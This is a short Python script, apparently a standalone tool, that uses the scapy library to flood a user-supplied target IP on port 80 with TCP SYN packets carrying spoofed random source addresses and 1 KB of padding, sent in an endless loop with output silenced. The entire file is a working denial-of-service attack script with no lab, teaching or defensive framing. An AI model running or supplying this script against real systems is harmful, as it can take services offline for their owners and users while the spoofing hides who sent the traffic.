from scapy.all import *

target_ip = input('target_ip: ')
target_port = 80

ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)

tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

raw = Raw(b"X"*1024)

p = ip / tcp / raw

send(p, loop=1, verbose=0)